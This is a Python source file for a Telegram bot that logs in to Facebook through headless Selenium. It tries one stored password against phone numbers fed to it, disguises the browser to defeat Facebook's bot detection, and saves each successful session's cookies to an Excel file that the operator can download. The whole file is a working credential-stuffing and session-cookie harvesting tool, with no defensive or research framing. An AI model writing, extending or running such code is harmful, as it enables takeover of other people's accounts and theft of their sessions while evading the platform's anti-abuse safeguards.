import os
import logging
import asyncio
import json
import tempfile
import shutil
import time
import glob
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, ConversationHandler, filters
)
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from openpyxl import Workbook, load_workbook

# --- CONFIG ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
_admin_id = os.getenv("ADMIN_ID")
ADMIN_ID = int(_admin_id) if _admin_id else 0

PASSWORD_FILE = "fb_password.txt"
EXCEL_FILE = "cookies.xlsx"
DEBUG_PHOTO = "debug.png"

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
WAITING_PW, WAITING_PHONE = 1, 2

# --- BROWSER ENGINE ---

def get_driver():
    # Use a fresh temp dir every time to avoid the "Google search" loop
    profile_dir = tempfile.mkdtemp(prefix="fb_run_")
    options = Options()
    
    # FORCED HEADLESS MODE
    options.add_argument("--headless=new")
    options.add_argument(f"--user-data-dir={profile_dir}")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    
    # STEALTH DEFEAT FOR BOT DETECTION
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    
    options.add_argument(
        "user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
    )
    
    driver = webdriver.Chrome(options=options)
    
    # Patch the webdriver flag
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
    })
    
    return driver, profile_dir

def do_facebook_login(phone, password):
    driver, profile_dir = get_driver()
    wait = WebDriverWait(driver, 30)
    try:
        # STEP 1: FORCE NAVIGATION
        # We try twice to ensure we get off that Google "New Tab" page
        logging.info("Navigating to Facebook...")
        driver.get("https://m.facebook.com/login/")
        time.sleep(5)
        
        if "facebook.com" not in driver.current_url:
            logging.warning("Still on Google/Blank. Forcing JS redirect...")
            driver.execute_script("window.location.href = 'https://m.facebook.com/login/';")
            time.sleep(8)

        # STEP 2: DISMISS COOKIES
        driver.execute_script("""
            var btns = document.querySelectorAll('button, div[role="button"], a, span');
            for(var b of btns) {
                var t = (b.innerText || '').toLowerCase();
                if(t.includes('accept') || t.includes('allow') || t.includes('only allow')) {
                    b.click();
                    break;
                }
            }
        """)
        time.sleep(2)

        # STEP 3: FILL CREDENTIALS (JS INJECTION)
        try:
            wait.until(EC.presence_of_element_located((By.NAME, "email")))
            
            s_phone = phone.replace("'", "\\'")
            s_pass = password.replace("'", "\\'")
            
            driver.execute_script(f"document.getElementsByName('email')[0].value='{s_phone}';")
            driver.execute_script(f"document.getElementsByName('pass')[0].value='{s_pass}';")
            time.sleep(2)
            
            # STEP 4: CLICK LOGIN
            driver.execute_script("""
                var selectors = ['button[name="login"]', 'button[type="submit"]', '[role="button"]', '#loginbutton'];
                for (var sel of selectors) {
                    var btn = document.querySelector(sel);
                    if (btn) { btn.click(); break; }
                }
            """)
            logging.info("Login click sent.")
        except Exception:
            driver.save_screenshot(DEBUG_PHOTO)
            return None, "FB login page did not load. See screenshot."

        # STEP 5: MONITOR FOR COOKIES
        for _ in range(15):
            time.sleep(2)
            cookies = driver.get_cookies()
            if any(c['name'] == 'c_user' for c in cookies):
                logging.info("Success! Session captured.")
                return cookies, None
            
            if "checkpoint" in driver.current_url:
                driver.save_screenshot(DEBUG_PHOTO)
                return None, "Verification Required (Checkpoint)."
            
            if "login/device-based" in driver.current_url:
                # Successfully passed login but on 'Save Device' screen
                return driver.get_cookies(), None

        driver.save_screenshot(DEBUG_PHOTO)
        return None, "Timed out waiting for session tokens."

    except Exception as e:
        driver.save_screenshot(DEBUG_PHOTO)
        return None, f"Error: {str(e)}"
    finally:
        driver.quit()
        shutil.rmtree(profile_dir, ignore_errors=True)

# --- TELEGRAM HANDLERS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id == ADMIN_ID:
        await update.message.reply_text("Bot Active\n/setpw - Set Pass\n/add - Get Cookies\n/dl - Get Excel")

async def cmd_add_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id == ADMIN_ID:
        await update.message.reply_text("Send phone number:")
        return WAITING_PHONE

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not os.path.exists(PASSWORD_FILE):
        await update.message.reply_text("Set password first via /setpw")
        return ConversationHandler.END
    
    with open(PASSWORD_FILE, "r") as f: pw = f.read().strip()
    msg = await update.message.reply_text(f"⏳ Processing {phone}...")

    if os.path.exists(DEBUG_PHOTO): os.remove(DEBUG_PHOTO)

    cookies, error = await asyncio.to_thread(do_facebook_login, phone, pw)

    if error:
        await msg.edit_text(f"❌ {error}")
        if os.path.exists(DEBUG_PHOTO):
            await update.message.reply_photo(photo=open(DEBUG_PHOTO, 'rb'), caption="State at Failure")
    else:
        save_cookies_to_excel(phone, cookies)
        await msg.edit_text(f"✅ Success! Cookies saved.")
    return ConversationHandler.END

def save_cookies_to_excel(phone, cookies):
    c_json = json.dumps(cookies)
    if os.path.exists(EXCEL_FILE):
        wb = load_workbook(EXCEL_FILE); ws = wb.active
    else:
        wb = Workbook(); ws = wb.active
        ws.append(["#", "Phone", "Cookies"])
    ws.append([ws.max_row, phone, c_json])
    wb.save(EXCEL_FILE)

async def cmd_setpw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id == ADMIN_ID:
        await update.message.reply_text("Send FB Password:")
        return WAITING_PW

async def save_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with open(PASSWORD_FILE, "w") as f: f.write(update.message.text.strip())
    await update.message.reply_text("✅ Password Saved.")
    return ConversationHandler.END

async def dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id == ADMIN_ID and os.path.exists(EXCEL_FILE):
        await update.message.reply_document(open(EXCEL_FILE, "rb"), filename="fb_cookies.xlsx")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("dl", dl))
    
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("add", cmd_add_entry)],
        states={WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)]},
        fallbacks=[]
    ))
    
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("setpw", cmd_setpw)],
        states={WAITING_PW: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_password)]},
        fallbacks=[]
    ))
    
    app.run_polling()

if __name__ == "__main__":
    main()
